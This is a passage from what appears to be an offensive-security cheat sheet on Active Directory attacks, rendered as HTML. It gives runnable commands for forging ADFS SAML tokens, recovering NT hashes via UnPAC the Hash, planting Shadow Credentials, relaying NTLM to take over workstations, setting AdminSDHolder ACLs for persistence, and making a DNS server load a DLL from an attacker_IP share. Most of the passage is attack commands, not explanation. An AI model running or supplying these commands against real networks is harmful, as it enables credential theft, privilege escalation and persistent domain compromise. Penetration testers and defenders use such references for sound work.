<a id="__codelineno-224-4" name="__codelineno-224-4" href="#__codelineno-224-4"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">mandiant</span><span class="p">/</span><span class="n">ADFSpoof</span><span class="p">.</span><span class="n">git</span> 
<a id="__codelineno-224-5" name="__codelineno-224-5" href="#__codelineno-224-5"></a><span class="n">virtualenv3</span> <span class="n">venvADFSSpoof</span>
<a id="__codelineno-224-6" name="__codelineno-224-6" href="#__codelineno-224-6"></a><span class="n">source</span> <span class="n">venvADFSSpoof</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">activate</span>
<a id="__codelineno-224-7" name="__codelineno-224-7" href="#__codelineno-224-7"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">lxml</span>
<a id="__codelineno-224-8" name="__codelineno-224-8" href="#__codelineno-224-8"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">signxml</span>
<a id="__codelineno-224-9" name="__codelineno-224-9" href="#__codelineno-224-9"></a><span class="n">pip</span> <span class="n">uninstall</span> <span class="n">-y</span> <span class="n">cryptography</span>
<a id="__codelineno-224-10" name="__codelineno-224-10" href="#__codelineno-224-10"></a><span class="nb">cd </span><span class="n">cryptography</span>
<a id="__codelineno-224-11" name="__codelineno-224-11" href="#__codelineno-224-11"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">-e</span> <span class="p">.</span>
<a id="__codelineno-224-12" name="__codelineno-224-12" href="#__codelineno-224-12"></a><span class="nb">cd </span><span class="p">../</span><span class="n">ADFSpoof</span>
<a id="__codelineno-224-13" name="__codelineno-224-13" href="#__codelineno-224-13"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">-r</span> <span class="n">requirements</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-224-14" name="__codelineno-224-14" href="#__codelineno-224-14"></a><span class="n">python</span> <span class="n">ADFSpoof</span><span class="p">.</span><span class="n">py</span> <span class="n">-b</span> <span class="n">EncryptedPfx</span><span class="p">.</span><span class="n">bin</span> <span class="n">DkmKey</span><span class="p">.</span><span class="n">bin</span> <span class="n">-s</span> <span class="n">adfs</span><span class="p">.</span><span class="n">pentest</span><span class="p">.</span><span class="n">lab</span> <span class="n">saml2</span> <span class="p">-</span><span class="n">-endpoint</span> <span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">contoso</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">adfs</span><span class="p">/</span><span class="nb">ls</span>
<a id="__codelineno-224-15" name="__codelineno-224-15" href="#__codelineno-224-15"></a><span class="p">/</span><span class="n">SamlResponseServlet</span> <span class="p">-</span><span class="n">-nameidformat</span> <span class="n">urn</span><span class="p">:</span><span class="n">oasis</span><span class="p">:</span><span class="n">names</span><span class="p">:</span><span class="n">tc</span><span class="p">:</span><span class="n">SAML</span><span class="p">:</span><span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">:</span><span class="n">nameid-format</span><span class="p">:</span><span class="n">transient</span> <span class="p">-</span><span class="n">-nameid</span> <span class="s1">&#39;PENTEST\administrator&#39;</span> <span class="p">-</span><span class="n">-rpidentifier</span> <span class="n">Supervision</span> <span class="p">-</span><span class="n">-assertions</span> <span class="s1">&#39;&lt;Attribute Name=&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&quot;&gt;&lt;AttributeValue&gt;PENTEST\administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#39;</span>
</code></pre></div></p>
<p>Other interesting tools to exploit AD FS: 
* <a href="https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml">WhiskeySAML</a></p>
<h2 id="unpac-the-hash">UnPAC The Hash</h2>
<p>Using the <strong>UnPAC The Hash</strong> method, you can retrieve the NT Hash for an User via its certificate.</p>
<ul>
<li>Windows
    <div class="highlight"><pre><span></span><code><a id="__codelineno-225-1" name="__codelineno-225-1" href="#__codelineno-225-1"></a><span class="c"># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.</span>
<a id="__codelineno-225-2" name="__codelineno-225-2" href="#__codelineno-225-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">getcredentials</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s2">&quot;TARGET_SAMNAME&quot;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="s2">&quot;BASE64_CERTIFICATE&quot;</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="s2">&quot;FQDN_DOMAIN&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DOMAIN_CONTROLLER&quot;</span> <span class="p">/</span><span class="n">show</span>
</code></pre></div></li>
<li>Linux
    <div class="highlight"><pre><span></span><code><a id="__codelineno-226-1" name="__codelineno-226-1" href="#__codelineno-226-1"></a><span class="c"># Obtain a TGT by validating a PKINIT pre-authentication</span>
<a id="__codelineno-226-2" name="__codelineno-226-2" href="#__codelineno-226-2"></a><span class="p">$</span> <span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-cert-pfx</span> <span class="s2">&quot;PATH_TO_CERTIFICATE&quot;</span> <span class="n">-pfx-pass</span> <span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-226-3" name="__codelineno-226-3" href="#__codelineno-226-3"></a>
<a id="__codelineno-226-4" name="__codelineno-226-4" href="#__codelineno-226-4"></a><span class="c"># Use the session key to recover the NT hash</span>
<a id="__codelineno-226-5" name="__codelineno-226-5" href="#__codelineno-226-5"></a><span class="p">$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="s2">&quot;TGT_CCACHE_FILE&quot;</span> <span class="n">getnthash</span><span class="p">.</span><span class="n">py</span> <span class="n">-key</span> <span class="s1">&#39;AS-REP encryption key&#39;</span> <span class="s1">&#39;FQDN_DOMAIN&#39;</span><span class="p">/</span><span class="s1">&#39;TARGET_SAMNAME&#39;</span>
</code></pre></div></li>
</ul>
<h2 id="shadow-credentials">Shadow Credentials</h2>
<blockquote>
<p>Add <strong>Key Credentials</strong> to the attribute <code>msDS-KeyCredentialLink</code> of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists</p>
<p><strong>Requirements</strong>:
* Domain Controller on (at least) Windows Server 2016
* Domain must have Active Directory <code>Certificate Services</code> and <code>Certificate Authority</code> configured
* PKINIT Kerberos authentication
* An account with the delegated rights to write to the <code>msDS-KeyCredentialLink</code> attribute of the target object</p>
<p><strong>Exploitation</strong>: 
- From Windows, use <a href="https://github.com/eladshamir/Whisker">Whisker</a>:
  <div class="highlight"><pre><span></span><code><a id="__codelineno-227-1" name="__codelineno-227-1" href="#__codelineno-227-1"></a><span class="c"># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.</span>
<a id="__codelineno-227-2" name="__codelineno-227-2" href="#__codelineno-227-2"></a><span class="n">Whisker</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">computername</span><span class="p">$</span>
<a id="__codelineno-227-3" name="__codelineno-227-3" href="#__codelineno-227-3"></a><span class="c"># Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.</span>
<a id="__codelineno-227-4" name="__codelineno-227-4" href="#__codelineno-227-4"></a><span class="n">Whisker</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="s2">&quot;TARGET_SAMNAME&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="s2">&quot;FQDN_DOMAIN&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DOMAIN_CONTROLLER&quot;</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="s2">&quot;cert.pfx&quot;</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s2">&quot;pfx-password&quot;</span>
<a id="__codelineno-227-5" name="__codelineno-227-5" href="#__codelineno-227-5"></a><span class="n">Whisker</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">computername</span><span class="p">$</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">constoso</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc1</span><span class="p">.</span><span class="n">contoso</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">P</span><span class="nv">@ssword1</span><span class="p">]</span>
<a id="__codelineno-227-6" name="__codelineno-227-6" href="#__codelineno-227-6"></a><span class="c"># Removes a key credential from the target object specified by a DeviceID GUID.</span>
<a id="__codelineno-227-7" name="__codelineno-227-7" href="#__codelineno-227-7"></a><span class="n">Whisker</span><span class="p">.</span><span class="n">exe</span> <span class="n">remove</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">computername</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">constoso</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc1</span><span class="p">.</span><span class="n">contoso</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">remove</span><span class="p">:</span><span class="n">2de4643a</span><span class="p">-</span><span class="n">2e0b</span><span class="p">-</span><span class="n">438f-a99d</span><span class="p">-</span><span class="n">5cb058b3254b</span>
</code></pre></div></p>
<ul>
<li>From Linux, use <a href="https://github.com/ShutdownRepo/pyWhisker">pyWhisker</a>:
  <div class="highlight"><pre><span></span><code><a id="__codelineno-228-1" name="__codelineno-228-1" href="#__codelineno-228-1"></a><span class="c1"># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.</span>
<a id="__codelineno-228-2" name="__codelineno-228-2" href="#__codelineno-228-2"></a>python3<span class="w"> </span>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;domain.local&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;user1&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;complexpassword&quot;</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">&quot;user2&quot;</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">&quot;list&quot;</span>
<a id="__codelineno-228-3" name="__codelineno-228-3" href="#__codelineno-228-3"></a><span class="c1"># Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.</span>
<a id="__codelineno-228-4" name="__codelineno-228-4" href="#__codelineno-228-4"></a>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;FQDN_DOMAIN&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;user1&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">&quot;TARGET_SAMNAME&quot;</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">&quot;list&quot;</span>
<a id="__codelineno-228-5" name="__codelineno-228-5" href="#__codelineno-228-5"></a>python3<span class="w"> </span>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;domain.local&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;user1&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;complexpassword&quot;</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">&quot;user2&quot;</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">&quot;add&quot;</span><span class="w"> </span>--filename<span class="w"> </span><span class="s2">&quot;test1&quot;</span>
<a id="__codelineno-228-6" name="__codelineno-228-6" href="#__codelineno-228-6"></a><span class="c1"># Removes a key credential from the target object specified by a DeviceID GUID.</span>
<a id="__codelineno-228-7" name="__codelineno-228-7" href="#__codelineno-228-7"></a>python3<span class="w"> </span>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;domain.local&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;user1&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;complexpassword&quot;</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">&quot;user2&quot;</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">&quot;remove&quot;</span><span class="w"> </span>--device-id<span class="w"> </span><span class="s2">&quot;a8ce856e-9b58-61f9-8fd3-b079689eb46e&quot;</span>
</code></pre></div></li>
</ul>
<p><strong>Scenario</strong>:</p>
<ul>
<li><strong>Scenario 1</strong>: Shadow Credential relaying</li>
<li>Trigger an NTLM authentication from <code>DC01</code> (PetitPotam)</li>
<li>Relay it to <code>DC02</code> (ntlmrelayx)</li>
<li>Edit <code>DC01</code>'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)</li>
<li>
<p>Alternatively : <code>ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'</code></p>
</li>
<li>
<p><strong>Scenario 2</strong>: Workstation Takeover with RBCD
  <div class="highlight"><pre><span></span><code><a id="__codelineno-229-1" name="__codelineno-229-1" href="#__codelineno-229-1"></a><span class="c"># Only for C2: Add Reverse Port Forward from 8081 to Team Server 81</span>
<a id="__codelineno-229-2" name="__codelineno-229-2" href="#__codelineno-229-2"></a>
<a id="__codelineno-229-3" name="__codelineno-229-3" href="#__codelineno-229-3"></a><span class="c"># Set up ntlmrelayx to relay authentication from target workstation to DC </span>
<a id="__codelineno-229-4" name="__codelineno-229-4" href="#__codelineno-229-4"></a><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc1</span><span class="p">.</span><span class="n">ez</span><span class="p">.</span><span class="n">lab</span> <span class="p">-</span><span class="n">-shadow-credentials</span> <span class="p">-</span><span class="n">-shadow-target</span> <span class="n">ws2</span><span class="p">\$</span> <span class="p">-</span><span class="n">-http-port</span> <span class="n">81</span>
<a id="__codelineno-229-5" name="__codelineno-229-5" href="#__codelineno-229-5"></a>
<a id="__codelineno-229-6" name="__codelineno-229-6" href="#__codelineno-229-6"></a><span class="c"># Execute printer bug to trigger authentication from target workstation </span>
<a id="__codelineno-229-7" name="__codelineno-229-7" href="#__codelineno-229-7"></a><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="n">ez</span><span class="p">.</span><span class="n">lab</span><span class="p">/</span><span class="n">matt</span><span class="p">:</span><span class="n">Password1</span><span class="p">\!</span><span class="nv">@ws2</span><span class="p">.</span><span class="n">ez</span><span class="p">.</span><span class="n">lab</span> <span class="n">ws1</span><span class="nv">@8081</span><span class="p">/</span><span class="n">file</span>
<a id="__codelineno-229-8" name="__codelineno-229-8" href="#__codelineno-229-8"></a>
<a id="__codelineno-229-9" name="__codelineno-229-9" href="#__codelineno-229-9"></a><span class="c"># Get a TGT using the newly acquired certificate via PKINIT </span>
<a id="__codelineno-229-10" name="__codelineno-229-10" href="#__codelineno-229-10"></a><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">ez</span><span class="p">.</span><span class="n">lab</span><span class="p">/</span><span class="n">ws2</span><span class="p">\$</span> <span class="n">ws2</span><span class="p">.</span><span class="n">ccache</span> <span class="n">-cert-pfx</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">impacket</span><span class="p">/</span><span class="n">examples</span><span class="p">/</span><span class="n">T12uyM5x</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-pfx-pass</span> <span class="n">5j6fNfnsU7BkTWQOJhpR</span>
<a id="__codelineno-229-11" name="__codelineno-229-11" href="#__codelineno-229-11"></a>
<a id="__codelineno-229-12" name="__codelineno-229-12" href="#__codelineno-229-12"></a><span class="c"># Get a ST (service ticket) for the target account </span>
<a id="__codelineno-229-13" name="__codelineno-229-13" href="#__codelineno-229-13"></a><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">gets4uticket</span><span class="p">.</span><span class="n">py</span> <span class="n">kerberos</span><span class="p">+</span><span class="n">ccache</span><span class="p">://</span><span class="n">ez</span><span class="p">.</span><span class="n">lab</span><span class="p">\\</span><span class="n">ws2</span><span class="p">\$:</span><span class="n">ws2</span><span class="p">.</span><span class="n">ccache</span><span class="nv">@dc1</span><span class="p">.</span><span class="n">ez</span><span class="p">.</span><span class="n">lab</span> <span class="n">cifs</span><span class="p">/</span><span class="n">ws2</span><span class="p">.</span><span class="n">ez</span><span class="p">.</span><span class="n">lab</span><span class="nv">@ez</span><span class="p">.</span><span class="n">lab</span> <span class="n">administrator</span><span class="nv">@ez</span><span class="p">.</span><span class="n">lab</span> <span class="n">administrator_tgs</span><span class="p">.</span><span class="n">ccache</span> <span class="n">-v</span>
<a id="__codelineno-229-14" name="__codelineno-229-14" href="#__codelineno-229-14"></a>
<a id="__codelineno-229-15" name="__codelineno-229-15" href="#__codelineno-229-15"></a><span class="c"># Utilize the ST for future activity </span>
<a id="__codelineno-229-16" name="__codelineno-229-16" href="#__codelineno-229-16"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">opt</span><span class="p">/</span><span class="n">pkinittools</span><span class="p">/</span><span class="n">administrator_ws2</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-229-17" name="__codelineno-229-17" href="#__codelineno-229-17"></a><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">ez</span><span class="p">.</span><span class="n">lab</span><span class="p">/</span><span class="n">administrator</span><span class="nv">@ws2</span><span class="p">.</span><span class="n">ez</span><span class="p">.</span><span class="n">lab</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="active-directory-groups">Active Directory Groups</h2>
<h2 id="dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</h2>
<p>If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object <code>CN=AdminSDHolder,CN=System</code> or set <code>"dminCount</code> attribute to <code>0</code> for the required object.</p>
<blockquote>
<p>The AdminCount attribute is set to <code>1</code> automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).</p>
</blockquote>
<p>Find users with <code>AdminCount=1</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-230-1" name="__codelineno-230-1" href="#__codelineno-230-1"></a><span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-admin-count</span>
<a id="__codelineno-230-2" name="__codelineno-230-2" href="#__codelineno-230-2"></a><span class="c"># or</span>
<a id="__codelineno-230-3" name="__codelineno-230-3" href="#__codelineno-230-3"></a><span class="n">python</span> <span class="n">ldapdomaindump</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">john</span> <span class="n">-p</span> <span class="n">pass123</span> <span class="n">-d</span> <span class="s1">&#39;;&#39;</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-230-4" name="__codelineno-230-4" href="#__codelineno-230-4"></a><span class="n">jq</span> <span class="n">-r</span> <span class="s1">&#39;.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]&#39;</span> <span class="n">domain_users</span><span class="p">.</span><span class="n">json</span>
<a id="__codelineno-230-5" name="__codelineno-230-5" href="#__codelineno-230-5"></a><span class="c"># or</span>
<a id="__codelineno-230-6" name="__codelineno-230-6" href="#__codelineno-230-6"></a><span class="nb">Get-ADUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(objectcategory=person)(samaccountname=*)(admincount=1)&quot;</span>
<a id="__codelineno-230-7" name="__codelineno-230-7" href="#__codelineno-230-7"></a><span class="nb">Get-ADGroup</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(objectcategory=group) (admincount=1)&quot;</span>
<a id="__codelineno-230-8" name="__codelineno-230-8" href="#__codelineno-230-8"></a><span class="c"># or</span>
<a id="__codelineno-230-9" name="__codelineno-230-9" href="#__codelineno-230-9"></a><span class="p">(</span><span class="no">[adsisearcher]</span><span class="s2">&quot;(AdminCount=1)&quot;</span><span class="p">).</span><span class="n">findall</span><span class="p">()</span>
</code></pre></div>
<h3 id="adminsdholder-abuse">AdminSDHolder Abuse</h3>
<blockquote>
<p>The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.</p>
</blockquote>
<p>If you modify the permissions of <strong>AdminSDHolder</strong>, that permission template will be pushed out to all protected accounts automatically by <code>SDProp</code> (in an hour).
E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-231-1" name="__codelineno-231-1" href="#__codelineno-231-1"></a><span class="c"># Add a user to the AdminSDHolder group:</span>
<a id="__codelineno-231-2" name="__codelineno-231-2" href="#__codelineno-231-2"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System,DC=domain,DC=local&#39;</span> <span class="n">-PrincipalIdentity</span> <span class="n">username</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>
<a id="__codelineno-231-3" name="__codelineno-231-3" href="#__codelineno-231-3"></a>
<a id="__codelineno-231-4" name="__codelineno-231-4" href="#__codelineno-231-4"></a><span class="c"># Right to reset password for toto using the account titi</span>
<a id="__codelineno-231-5" name="__codelineno-231-5" href="#__codelineno-231-5"></a><span class="nb">Add-ObjectACL</span> <span class="n">-TargetSamAccountName</span> <span class="n">toto</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">titi</span> <span class="n">-Rights</span> <span class="n">ResetPassword</span>
<a id="__codelineno-231-6" name="__codelineno-231-6" href="#__codelineno-231-6"></a>
<a id="__codelineno-231-7" name="__codelineno-231-7" href="#__codelineno-231-7"></a><span class="c"># Give all rights</span>
<a id="__codelineno-231-8" name="__codelineno-231-8" href="#__codelineno-231-8"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetADSprefix</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System&#39;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">toto</span> <span class="n">-Verbose</span> <span class="n">-Rights</span> <span class="n">All</span>
</code></pre></div>
<h2 id="abusing-dns-admins-group">Abusing DNS Admins Group</h2>
<blockquote>
<p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Require privileges to restart the DNS service.</p>
<ul>
<li>Enumerate members of DNSAdmins group
    <div class="highlight"><pre><span></span><code><a id="__codelineno-232-1" name="__codelineno-232-1" href="#__codelineno-232-1"></a><span class="nb">Get-NetGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;DNSAdmins&quot;</span>
<a id="__codelineno-232-2" name="__codelineno-232-2" href="#__codelineno-232-2"></a><span class="nb">Get-ADGroupMember</span> <span class="n">-Identity</span> <span class="n">DNSAdmins</span>
</code></pre></div></li>
<li>Change dll loaded by the DNS service
    <div class="highlight"><pre><span></span><code><a id="__codelineno-233-1" name="__codelineno-233-1" href="#__codelineno-233-1"></a><span class="c"># with RSAT</span>
<a id="__codelineno-233-2" name="__codelineno-233-2" href="#__codelineno-233-2"></a><span class="n">dnscmd</span> <span class="p">&lt;</span><span class="n">servername</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="p">\\</span><span class="n">attacker_IP</span><span class="p">\</span><span class="n">dll</span><span class="p">\</span><span class="n">mimilib</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-233-3" name="__codelineno-233-3" href="#__codelineno-233-3"></a><span class="n">dnscmd</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">\</span><span class="n">exploit</span><span class="p">\</span><span class="n">privesc</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-233-4" name="__codelineno-233-4" href="#__codelineno-233-4"></a>
<a id="__codelineno-233-5" name="__codelineno-233-5" href="#__codelineno-233-5"></a><span class="c"># with DNSServer module</span>
<a id="__codelineno-233-6" name="__codelineno-233-6" href="#__codelineno-233-6"></a><span class="nv">$dnsettings</span> <span class="p">=</span> <span class="nb">Get-DnsServerSetting</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">servername</span><span class="p">&gt;</span> <span class="n">-Verbose</span> <span class="n">-All</span>
<a id="__codelineno-233-7" name="__codelineno-233-7" href="#__codelineno-233-7"></a><span class="nv">$dnsettings</span><span class="p">.</span><span class="n">ServerLevelPluginDll</span> <span class="p">=</span> <span class="s2">&quot;\attacker_IP\dll\mimilib.dll&quot;</span>
<a id="__codelineno-233-8" name="__codelineno-233-8" href="#__codelineno-233-8"></a><span class="nb">Set-DnsServerSetting</span> <span class="n">-InputObject</span> <span class="nv">$dnsettings</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">servername</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div></li>
<li>Check the previous command success
    <div class="highlight"><pre><span></span><code><a id="__codelineno-234-1" name="__codelineno-234-1" href="#__codelineno-234-1"></a><span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">DNS</span><span class="p">\</span><span class="n">Parameters</span><span class="p">\</span> <span class="n">-Name</span> <span class="n">ServerLevelPluginDll</span>
</code></pre></div></li>
<li>Restart DNS
    <div class="highlight"><pre><span></span><code><a id="__codelineno-235-1" name="__codelineno-235-1" href="#__codelineno-235-1"></a><span class="nb">sc </span><span class="p">\\</span><span class="n">dc01</span> <span class="n">stop</span> <span class="n">dns</span>
<a id="__codelineno-235-2" name="__codelineno-235-2" href="#__codelineno-235-2"></a><span class="nb">sc </span><span class="p">\\</span><span class="n">dc01</span> <span class="nb">start </span><span class="n">dns</span>
</code></pre></div></li>
</ul>
<h2 id="abusing-schema-admins-group">Abusing Schema Admins Group</h2>
<blockquote>
<p>The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.</p>
</blockquote>
<h2 id="abusing-backup-operators-group">Abusing Backup Operators Group</h2>
<blockquote>
<p>Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.</p>
</blockquote>
<p>This groups grants the following privileges :
- SeBackup privileges
- SeRestore privileges</p>
<ul>
<li>Get members of the group:
  <div class="highlight"><pre><span></span><code><a id="__codelineno-236-1" name="__codelineno-236-1" href="#__codelineno-236-1"></a><span class="n">PowerView</span><span class="p">&gt;</span> <span class="nb">Get-NetGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Backup Operators&quot;</span> <span class="n">-Recurse</span>
</code></pre></div></li>
<li>Enable privileges using <a href="https://github.com/giuliano108/SeBackupPrivilege">giuliano108/SeBackupPrivilege</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-237-1" name="__codelineno-237-1" href="#__codelineno-237-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
